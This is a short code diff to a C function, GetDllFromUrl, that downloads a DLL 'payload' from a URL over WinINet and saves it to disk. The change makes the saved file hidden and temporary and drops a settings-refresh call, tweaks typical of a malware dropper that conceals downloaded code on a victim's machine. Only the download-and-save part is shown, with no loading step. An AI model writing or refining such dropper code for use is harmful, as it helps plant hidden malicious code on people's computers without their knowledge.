@@ -52,7 +52,7 @@ BOOL GetDllFromUrl(const char* szUrl, const char* savePath) {
     }
 
     // Open a local file for writing the payload
-    HANDLE hFile = CreateFileA(savePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE hFile = CreateFileA(savePath, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS,  FILE_ATTRIBUTE_TEMPORARY | FILE_ATTRIBUTE_HIDDEN, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
         InternetCloseHandle(hInternet);
         InternetCloseHandle(hInternetFile);
@@ -73,8 +73,7 @@ BOOL GetDllFromUrl(const char* szUrl, const char* savePath) {
 
     InternetCloseHandle(hInternet);
     InternetCloseHandle(hInternetFile);
-    InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
-
+    
     return TRUE;
 }
 ```
